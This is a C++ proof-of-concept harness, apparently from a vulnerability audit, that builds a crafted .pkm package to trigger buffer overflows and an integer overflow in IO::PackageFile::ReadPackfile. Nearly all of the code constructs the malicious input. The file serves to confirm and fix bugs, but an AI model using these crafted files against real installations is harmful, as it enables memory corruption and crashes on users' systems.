// P3 proof: IO::PackageFile::ReadPackfile (package_file_read.cpp:413) over a crafted .pkm.
// FileSystem::OpenFile / ReadFile are replaced by a one-file in-memory FileSystem (the unit tree
// has no FileSystem); everything from the header word on is the real body.
// argv[1]: "name" = an entry name longer than the 0x1840 frame buffer (format 3, :596)
//          "meta" = a metadata string longer than the frame buffer (format 3, ReadStringRaw :381)
//          "icon" = icon width * height overflows int32 (:514)
#include "io/FileSystem.h"
#include "io/PackageFile.h"
#include "io/Stream.h"
#include "system/String.h"
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <vector>

static std::vector<uint8_t> g_file;
alignas(16) static unsigned char g_fsMem[sizeof(IO::FileSystem)];
IO::FileSystem* IO::FileSystem::_singleton = reinterpret_cast<IO::FileSystem*>(g_fsMem);

RtIO::FileInfo IO::FileSystem::OpenFile(const System::Filename&) {
    RtIO::FileInfo fi;
    fi.handle = 0;          // a packed entry: ReadPackfile's seek is then `fi->cursor = hdr` only
    fi.size = static_cast<int32_t>(g_file.size());
    fi.cursor = 0;
    return fi;
}
bool IO::FileSystem::ReadFile(RtIO::FileInfo& fi, int32_t n, void* dst) {
    if (n < 0 || static_cast<size_t>(fi.cursor) + static_cast<size_t>(n) > g_file.size())
        return false;
    std::memcpy(dst, g_file.data() + fi.cursor, static_cast<size_t>(n));
    fi.cursor += n;
    return true;
}
void IO::CompressedStream::Commit() {}

int main(int argc, char** argv) {
    const char* mode = argc > 1 ? argv[1] : "name";
    // the CompressedStream payload (one STORED block)
    std::vector<uint8_t> p;
    auto put32 = [&](std::vector<uint8_t>& v, uint32_t x) { for (int i = 0; i < 4; ++i) v.push_back(uint8_t(x >> (8 * i))); };
    auto put16 = [&](std::vector<uint8_t>& v, uint16_t x) { v.push_back(uint8_t(x)); v.push_back(uint8_t(x >> 8)); };
    const bool meta = std::strcmp(mode, "meta") == 0;
    const bool icon = std::strcmp(mode, "icon") == 0;
    put32(p, 1);                                  // fileCount
    put32(p, 3);                                  // formatVersion (raw UTF-8 strings)
    for (int i = 0; i < 4; ++i) put32(p, 0);      // version, userVersion, priority, platform
    p.push_back(0);                               // overridable
    put32(p, 0);                                  // crc
    put32(p, icon ? 0x10000 : 0);                 // icon width
    put32(p, icon ? 0x10000 : 0);                 // icon height: 0x10000 * 0x10000 overflows int32
    put32(p, 0);                                  // preview byte count (formatVersion >= 2)
    if (meta) {
        put32(p, 0x2000);                         // name length > 0x1840
        p.resize(p.size() + 0x2000, 'M');
    } else {
        for (int i = 0; i < 3; ++i) { put32(p, 1); p.push_back('x'); }   // name, author, description
        put32(p, 0x2000);                         // entry name length > 0x1840
        p.resize(p.size() + 0x2000, 'N');
    }
    p.resize(p.size() + 64, 0);
    std::vector<uint8_t> blob;
    put32(blob, 1);                               // blockCount
    put32(blob, 12);                              // sourceOffset
    put16(blob, 0);                               // stored
    put16(blob, static_cast<uint16_t>(p.size())); // uncompressedSize
    blob.insert(blob.end(), p.begin(), p.end());
    // the .pkm: header word (bit 31 = metadata, low bits = seek to 4, the blob length), blob length, blob
    put32(g_file, 0x80000004u);
    put32(g_file, static_cast<uint32_t>(blob.size()));
    g_file.insert(g_file.end(), blob.begin(), blob.end());

    IO::PackageFile* pf = new IO::PackageFile();
    System::Filename fn;
    const bool ok = pf->ReadPackfile(fn);
    std::printf("ReadPackfile -> %d (no overflow reported)\n", ok ? 1 : 0);
    return 0;
}
